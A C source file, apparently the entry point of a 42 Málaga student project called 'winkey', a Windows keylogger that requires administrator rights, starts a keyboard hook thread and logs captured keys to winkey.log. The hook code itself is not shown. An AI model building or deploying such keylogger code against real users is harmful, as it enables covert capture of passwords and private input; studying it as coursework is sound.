/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/08 13:00:34 by vzurera-          #+#    #+#             */
/*   Updated: 2025/05/18 11:14:06 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

// Teclas especiales (F1, Retroceso, Enter, Cursores, Modificadores, etc.)

#pragma region "Includes"

	#include "winkey.h"

	#include <stdio.h>
	#include <windows.h>

#pragma endregion

#pragma region "Variables"

	char	g_LogPath[MAX_PATH];
	char	g_Buffer[BUFFER_SIZE + 1];
	size_t	g_BufferLen;

#pragma endregion

#pragma region "Is Admin"

	BOOL IsAdmin(void) {
		BOOL isAdmin = FALSE;
		HANDLE hToken = NULL;
		
		if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
			TOKEN_ELEVATION elevation;
			DWORD dwSize = sizeof(TOKEN_ELEVATION);
			if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
				isAdmin = elevation.TokenIsElevated;       
			CloseHandle(hToken);
		}
		
		return (isAdmin);
	}

#pragma endregion

#pragma region "Main"

	int main(void) {
		// check if it has administrator privileges
		if (!IsAdmin()) return (printf("\nAdministrator privileges are required\n"), 1);

		// Set log path
		char *lastSlash;
		if (!GetModuleFileName(NULL, g_LogPath, MAX_PATH) || !(lastSlash = strrchr(g_LogPath, '\\')))
			strcpy_s(g_LogPath, MAX_PATH, "c:\\winkey.log");
		else strcpy_s(lastSlash + 1, g_LogPath + MAX_PATH - (lastSlash + 1), "winkey.log");

		CreateThread(NULL, 0, HookThread, NULL, 0, NULL);

		// Wait for close event
		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, "Global\\WinkeyTerminateEvent");
		while(TRUE) {
			if (WaitForSingleObject(hEvent, 100) == WAIT_OBJECT_0) {
				LogToFile();
				break;
			}
		}

		return (0);
	}

#pragma endregion
